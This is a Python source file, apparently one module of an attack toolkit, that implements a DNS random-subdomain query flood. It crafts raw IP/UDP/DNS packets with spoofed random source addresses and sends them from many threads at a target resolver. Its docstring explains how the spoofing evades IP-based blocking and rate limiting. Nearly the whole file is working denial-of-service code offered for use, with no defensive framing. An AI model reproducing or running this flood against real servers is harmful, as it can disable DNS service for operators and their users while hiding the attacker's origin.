import os
import sys
import socket
import struct
import random
import time
import threading
import string
import logging
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    from attack_strategy import AttackStrategy
except ImportError:
    from .attack_strategy import AttackStrategy

"""
DNS Random Subdomain Query Flood Attack Implementation

This attack exploits DNS servers by generating massive amounts of random subdomain queries
that are unlikely to exist in the DNS cache, forcing the server to perform expensive
recursive lookups or return NXDOMAIN responses. Uses IP SPOOFING to evade detection.

ATTACK MECHANICS:
================
- Generates random subdomains like: abc123.example.com, xyz789.google.com
- Forces DNS cache misses by querying non-existent domains
- Overwhelms DNS server with processing overhead
- Uses IP spoofing to appear as requests from different sources
- Bypasses rate limiting based on source IP addresses

DNS PACKET STRUCTURE DETAILS:
=============================

1. IP HEADER (20 bytes) - WITH SPOOFING:
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Source Address (SPOOFED)                   |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Destination Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

2. UDP HEADER (8 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |            Length             |           Checksum            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

3. DNS HEADER (12 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Transaction ID                           |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |QR|   Opcode  |AA|TC|RD|RA|   Z    |        RCODE             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    QDCOUNT (Questions)                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    ANCOUNT (Answers)                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    NSCOUNT (Authority)                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    ARCOUNT (Additional)                       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   DNS Header Fields:
   - Transaction ID: Random 16-bit identifier for matching responses
   - QR: 0 (Query)
   - Opcode: 0 (Standard Query)
   - AA: 0 (Not Authoritative)
   - TC: 0 (Not Truncated)
   - RD: 1 (Recursion Desired)
   - RA: 0 (Recursion Available - not set in queries)
   - Z: 000 (Reserved bits)
   - RCODE: 0000 (No error)
   - QDCOUNT: 1 (One question)
   - ANCOUNT: 0 (No answers in query)
   - NSCOUNT: 0 (No authority records in query)
   - ARCOUNT: 0 (No additional records in query)

4. DNS QUESTION SECTION (Variable length):
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   /                     QNAME                     /
   /                                               /
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   |                     QTYPE                     |
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   |                     QCLASS                    |
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

   QNAME Format (domain name encoding):
   - Length-prefixed labels: 3www7example3com0
   - Each label prefixed by its length (1 byte)
   - Terminated by null byte (0x00)
   
   Example: "www.example.com" becomes:
   [3]['w']['w']['w'][7]['e']['x']['a']['m']['p']['l']['e'][3]['c']['o']['m'][0]

   QTYPE: 1 (A record - IPv4 address)
   QCLASS: 1 (IN - Internet class)

ATTACK STRATEGY WITH IP SPOOFING:
=================================
1. Generate random spoofed source IP (xxx.xxx.xxx.xxx)
2. Create random subdomain (e.g., abc123def.example.com)
3. Build DNS query packet with spoofed source
4. Send via raw socket to bypass OS DNS stack
5. DNS server must:
   - Process the query
   - Check cache (miss for random subdomain)
   - Perform recursive lookup or return NXDOMAIN
   - Consume CPU/memory resources
6. Spoofed source prevents simple IP-based blocking

SUBDOMAIN GENERATION PATTERNS:
==============================
- Random alphanumeric strings (8-15 characters)
- Multiple sublevels: random1.random2.domain.com
- Mixed case to bypass simple caching
- Various TLDs: .com, .org, .net, .edu
- Ensures cache misses and processing overhead

"""
console = Console()

dns_query_type_dict = {
    5: "CNAME",
    2: "NS",
    15: "MX",
    16: "TXT",
    46: "RRSIG",
    48: "DNSKEY",
    255: "ANY",
}


class DNSRandomSubdomainQueryFlood(AttackStrategy):
    """
    DNS Random Subdomain Query Flood Attack with IP Spoofing.
    """

    def __init__(
        self,
        target_ip,
        target_port=53,
        duration=60,
        threads=20,
        base_domains=None,
        query_types=None,
        log_file=None,
    ):
        super().__init__(target_ip, target_port, duration, threads)

        self.base_domains = base_domains or [
            "example.com",
            "google.com",
            "facebook.com",
            "twitter.com",
            "github.com",
            "stackoverflow.com",
            "microsoft.com",
            "amazon.com",
        ]

        self.query_types = query_types or [
            15,  # MX
            5,  # CNAME
            2,  # NS
            16,  # TXT
            46,  # RRSIG
            48,  # DNSKEY
            255,  # ANY
        ]

        self.subdomain_chars = string.ascii_lowercase + string.digits
        self.subdomain_min_length = 8
        self.subdomain_max_length = 15

        # Setup file logger (decoupled from console logger)
        log_path = log_file if log_file else "./dns_random_subdomain_query_flood.log"
        self.file_logger = logging.getLogger("DNS_RANDOM_SUBDOMAIN_FILE")
        self.file_logger.setLevel(logging.INFO)
        # Only add handler if not already present (avoid duplicate logs)
        if not self.file_logger.handlers:
            fh = logging.FileHandler(log_path)
            fh.setFormatter(
                logging.Formatter(
                    "[%(asctime)s] %(name)s - %(levelname)s - %(message)s"
                )
            )
            self.file_logger.addHandler(fh)
        self.file_logger.propagate = False

    def _generate_random_subdomain(self):
        """Generate a random subdomain string."""
        length = random.randint(self.subdomain_min_length, self.subdomain_max_length)
        subdomain = "".join(random.choice(self.subdomain_chars) for _ in range(length))
        return subdomain

    def _generate_random_domain(self):
        """Generate a random domain name with multiple subdomain levels."""
        base_domain = random.choice(self.base_domains)

        # 70% chance of single subdomain, 30% chance of multiple levels
        if random.random() < 0.7:
            subdomain = self._generate_random_subdomain()
            domain = f"{subdomain}.{base_domain}"
        else:
            # Multiple subdomain levels
            subdomain1 = self._generate_random_subdomain()
            subdomain2 = self._generate_random_subdomain()
            domain = f"{subdomain1}.{subdomain2}.{base_domain}"

        # self.logger.debug(f"Generated random domain: {domain}")
        # Optionally log to file_logger at debug/info level if needed
        return domain

    def _encode_domain_name(self, domain):
        """
        Encode domain name in DNS format (length-prefixed labels).

        Example: "www.example.com" -> b'\x03www\x07example\x03com\x00'
        """
        encoded = b""
        labels = domain.split(".")

        for label in labels:
            if len(label) > 63:
                raise ValueError(f"Label too long: {label}")
            encoded += bytes([len(label)]) + label.encode("ascii")

        encoded += b"\x00"  # Null terminator
        return encoded

    def _create_dns_header(self):
        """Create DNS header for query packet."""
        transaction_id = random.randint(1, 65535)

        # DNS flags: QR=0, Opcode=0000, AA=0, TC=0, RD=1, RA=0, Z=000, RCODE=0000
        flags = 0x0100  # Recursion Desired (RD) set

        qdcount = 1  # One question
        ancount = 0  # No answers
        nscount = 0  # No authority records
        arcount = 0  # No additional records

        dns_header = struct.pack(
            "!HHHHHH", transaction_id, flags, qdcount, ancount, nscount, arcount
        )

        return dns_header, transaction_id

    def _create_dns_question(self, domain, qtype=1, qclass=1):
        """
        Create DNS question section.

        Args:
            domain: Domain name to query
            qtype: Query type (1=A, 28=AAAA, etc.)
            qclass: Query class (1=IN)
        """
        encoded_domain = self._encode_domain_name(domain)
        question = encoded_domain + struct.pack("!HH", qtype, qclass)
        return question

    def _create_dns_query_packet(self, domain, qtype=1):
        """Create complete DNS query packet."""
        dns_header, _transaction_id = self._create_dns_header()
        dns_question = self._create_dns_question(domain, qtype)

        dns_packet = dns_header + dns_question

        # self.logger.debug(
        #     f"Created DNS query for {domain} (type {qtype}), "
        #     f"packet size: {len(dns_packet)} bytes, TXN ID: {transaction_id}"
        # )

        return dns_packet

    def _create_ip_header(self, source_ip, dest_ip, total_length):
        """Create IP header with spoofed source address."""
        version = 4
        ihl = 5
        tos = 0
        identification = random.randint(1, 65535)
        flags = 0x4000  # Don't Fragment
        fragment_offset = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        check = 0
        saddr = socket.inet_aton(source_ip)
        daddr = socket.inet_aton(dest_ip)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,
            tos,
            total_length,
            identification,
            flags | fragment_offset,
            ttl,
            protocol,
            check,
            saddr,
            daddr,
        )

        return ip_header

    def _create_udp_header(self, source_port, dest_port, udp_length):
        """Create UDP header."""
        checksum = 0
        udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)
        return udp_header

    def _calculate_udp_checksum(self, source_ip, dest_ip, udp_header, udp_data):
        """Calculate UDP checksum using pseudo-header."""
        pseudo_header = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip),
            0,
            socket.IPPROTO_UDP,
            len(udp_header) + len(udp_data),
        )

        checksum_data = pseudo_header + udp_header + udp_data
        return self.checksum(checksum_data)

    def _create_complete_packet(
        self, source_ip, dest_ip, source_port, dest_port, dns_packet
    ):
        """Create complete IP + UDP + DNS packet with spoofed source."""
        udp_length = 8 + len(dns_packet)
        total_length = 20 + udp_length

        # Create UDP header with zero checksum initially
        udp_header = self._create_udp_header(source_port, dest_port, udp_length)

        # Calculate UDP checksum
        udp_checksum = self._calculate_udp_checksum(
            source_ip, dest_ip, udp_header, dns_packet
        )

        # Recreate UDP header with proper checksum
        udp_header = struct.pack(
            "!HHHH", source_port, dest_port, udp_length, udp_checksum
        )

        # Create IP header
        ip_header = self._create_ip_header(source_ip, dest_ip, total_length)

        # Complete packet
        packet = ip_header + udp_header + dns_packet
        return packet

    def _send_dns_query(self, source_ip, source_port, domain, qtype):
        """Send a single DNS query with IP spoofing."""
        try:
            # Create DNS query packet
            dns_packet = self._create_dns_query_packet(domain, qtype)

            # Create complete packet with spoofed source
            complete_packet = self._create_complete_packet(
                source_ip, self.target_ip, source_port, self.target_port, dns_packet
            )

            # Send via raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            sock.sendto(complete_packet, (self.target_ip, 0))
            sock.close()

            self.packets_sent += 1
            req_info = {
                "timestamp": time.time(),
                "query_name": domain,
                "query_type": qtype,
                "spoofed_ip": source_ip,
                "spoofed_port": source_port,
            }
            self.metrics["dns_requests"].append(req_info)
            msg = f"Sent DNS query: {domain} (type {dns_query_type_dict.get(qtype, qtype)}) from {source_ip}:{source_port}"
            self.file_logger.info(msg)
            return True

        except Exception as e:
            err_msg = f"Error sending DNS query: {e}"
            console.print(f"[red]{err_msg}[/red]")
            self.file_logger.error(err_msg)
            return False

    def _check_privileges(self):
        """Check if running with appropriate privileges for raw sockets."""
        return self._check_raw_socket_privileges(socket.IPPROTO_UDP)

    def _start_worker_threads(self):
        """Start worker threads for the DNS flood attack."""
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._dns_flood_worker, name=f"DNSFlood-{i}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        return threads

    def _dns_flood_worker(self):
        """Worker thread for sending DNS queries with IP spoofing."""
        thread_id = threading.current_thread().ident

        while self.attack_active:
            try:
                # Generate random spoofed source
                source_ip = self.generate_random_ip()
                source_port = random.randint(1024, 65535)

                # Generate random domain and query type
                domain = self._generate_random_domain()
                qtype = random.choice(self.query_types)

                # Send DNS query
                self._send_dns_query(source_ip, source_port, domain, qtype)

                # Small delay to prevent overwhelming the system
                time.sleep(0.01)

            except Exception as e:
                err_msg = f"Error in DNS flood worker thread {thread_id}: {e}"
                console.print(f"[red]{err_msg}[/red]")
                self.file_logger.error(err_msg)
                continue

    def _monitor_attack_progress(self, start_time):
        """Monitor and display DNS attack progress."""
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0

                if rate < 100:
                    level = "[green]LOW[/green]"
                elif rate < 1000:
                    level = "[yellow]MEDIUM[/yellow]"
                else:
                    level = "[red]HIGH[/red]"

                progress_msg = (
                    f"Rate: {rate:.1f} qps [{level}] | "
                    f"Total sent: [bold cyan]{self.packets_sent:,}[/bold cyan] | "
                    f"Elapsed: [yellow]{elapsed:.1f}s[/yellow]"
                )
                console.print(f"\r{progress_msg}", end="\r")
                time.sleep(1)
        except KeyboardInterrupt:
            console.print(
                "\n[yellow]🛑 DNS random subdomain query flood attack interrupted by user[/yellow]"
            )
            self.file_logger.warning(
                "DNS random subdomain query flood attack interrupted by user"
            )

    def log_dns_request_stats(self):
        requests = self.metrics.get("dns_requests", [])
        total = len(requests)
        if total == 0:
            self.file_logger.info("DNS_REQUEST_STATS - No DNS requests recorded.")
            return

        domain_counts = {}
        type_counts = {}
        for req in requests:
            domain = req.get("query_name")
            qtype = req.get("query_type")
            domain_counts[domain] = domain_counts.get(domain, 0) + 1
            type_counts[qtype] = type_counts.get(qtype, 0) + 1

        unique_domains = len(domain_counts)
        unique_types = len(type_counts)
        top_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[
            :5
        ]
        top_types = sorted(type_counts.items(), key=lambda x: x[1], reverse=True)

        self.file_logger.info(f"DNS_REQUEST_STATS - Total requests: {total}")
        self.file_logger.info(f"DNS_REQUEST_STATS - Unique domains: {unique_domains}")
        self.file_logger.info(f"DNS_REQUEST_STATS - Unique query types: {unique_types}")
        self.file_logger.info(
            f"DNS_REQUEST_STATS - Top 5 queried domains: {top_domains}"
        )
        self.file_logger.info(
            f"DNS_REQUEST_STATS - Query type counts: {[(dns_query_type_dict.get(t, t), c) for t, c in top_types]}"
        )

    def attack(self):
        """Execute the DNS Random Subdomain Query Flood attack with IP spoofing."""
        self._print_attack_header()
        self._log_attack_parameters()
        if not self._check_privileges():
            return

        self.attack_active = True
        start_time = time.time()
        self.metrics["start_time"] = start_time

        threads = self._start_worker_threads()
        self._print_worker_threads_started()
        self._print_attack_in_progress()

        self._monitor_attack_progress(start_time)
        self.attack_active = False

        self._stop_worker_threads(threads)
        end_time = time.time()
        self._summarize_attack(start_time, end_time)
        self.log_dns_request_stats()

    def _print_attack_header(self):
        header_text = (
            f"[bold red]DNS RANDOM SUBDOMAIN QUERY FLOOD INITIATED[/bold red]\n"
            f"[bold white]Target:[/bold white] [yellow]{self.target_ip}:{self.target_port}[/yellow]\n"
            f"[bold white]Duration:[/bold white] [yellow]{self.duration} seconds[/yellow]\n"
            f"[bold white]Threads:[/bold white] [yellow]{self.threads}[/yellow]"
        )
        console.print(
            Panel.fit(
                header_text,
                title="DNS Random Subdomain Query Flood",
                border_style="magenta",
            )
        )

    def _log_attack_parameters(self):
        self.file_logger.info(
            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
        )
        self.file_logger.info(
            f"Base domains: {len(self.base_domains)}, Query types: {len(self.query_types)}"
        )
        self.file_logger.info(
            "IP SPOOFING ENABLED: Using random source IP addresses for each query"
        )

    def _print_worker_threads_started(self):
        console.print(
            f"[bold green]✓ {self.threads} DNS random subdomain flood worker threads started[/bold green]"
        )

    def _print_attack_in_progress(self):
        console.print(
            "[blue]DNS Random Subdomain Query Flood in progress... Press Ctrl+C to stop[/blue]"
        )

    def _stop_worker_threads(self, threads):
        console.print(
            "\n[bold red]Stopping DNS random subdomain query flood attack threads...[/bold red]"
        )
        for thread in threads:
            thread.join(timeout=1)

    def _summarize_attack(self, start_time, end_time):
        duration_sec = end_time - start_time
        total_packets = self.packets_sent
        avg_rate = total_packets / duration_sec if duration_sec > 0 else 0

        self.metrics["end_time"] = end_time
        self.metrics["total_packets"] = total_packets
        self.metrics["avg_rate"] = avg_rate

        if total_packets >= 10000:
            packet_color = "green"
        elif total_packets >= 1000:
            packet_color = "yellow"
        else:
            packet_color = "red"
        if avg_rate >= 1000:
            rate_color = "green"
        elif avg_rate >= 100:
            rate_color = "yellow"
        else:
            rate_color = "red"

        summary_table = Table.grid(padding=(0, 2))
        summary_table.add_column(justify="left")
        summary_table.add_column(justify="right")
        summary_table.add_row(
            "[bold white]📦 Total Packets Sent[/bold white]",
            f"[{packet_color}]{total_packets:,}[/{packet_color}]",
        )
        summary_table.add_row(
            "[bold white]⏱️  Duration[/bold white]",
            f"[cyan]{duration_sec:.2f} seconds[/cyan]",
        )
        summary_table.add_row(
            "[bold white]🚀 Average Rate[/bold white]",
            f"[{rate_color}]{avg_rate:.2f} packets/sec[/{rate_color}]",
        )

        summary_panel = Panel.fit(
            summary_table,
            title="[bold green]DNS RANDOM SUBDOMAIN QUERY FLOOD COMPLETED[/bold green]",
            border_style="cyan",
        )
        console.print(summary_panel)
        self.file_logger.info(
            f"Attack completed. Packets: {total_packets}, Time: {duration_sec:.2f}s, Rate: {avg_rate:.2f} pps"
        )